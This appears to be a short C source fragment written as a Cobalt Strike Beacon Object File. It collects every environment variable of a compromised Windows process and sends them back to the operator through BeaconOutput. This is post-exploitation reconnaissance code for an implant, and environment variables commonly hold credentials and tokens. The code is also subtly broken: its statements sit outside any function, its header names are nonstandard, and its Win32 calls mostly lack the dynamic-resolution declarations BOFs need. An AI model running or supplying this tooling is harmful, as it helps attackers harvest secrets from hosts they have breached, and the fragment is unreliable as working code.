#include <wintypes.h>
#include <winbaseapi.h>
#include <beacon.h>

formatp buffer;
int output_length;
char *output;
char *variable;
char *environment;

environment = (char *) GetEnvironmentStrings();
if (environment == NULL) {
    BeaconPrintf(CALLBACK_ERROR, "GetEnvironmentStrings failed.");
} else {
    BeaconFormatAlloc(&buffer, 4096);
    BeaconFormatPrintf(&buffer, "Gathering Process Environment Variables:\n\n");

    for (variable = environment; *variable; variable += KERNEL32$lstrlenA(variable) + 1) {
        BeaconFormatPrintf(&buffer, "%s\n", variable);
    }

    output = BeaconFormatToString(&buffer, &output_length);
    BeaconOutput(CALLBACK_OUTPUT, output, output_length);
    BeaconFormatFree(&buffer);
    FreeEnvironmentStringsA(environment);
}
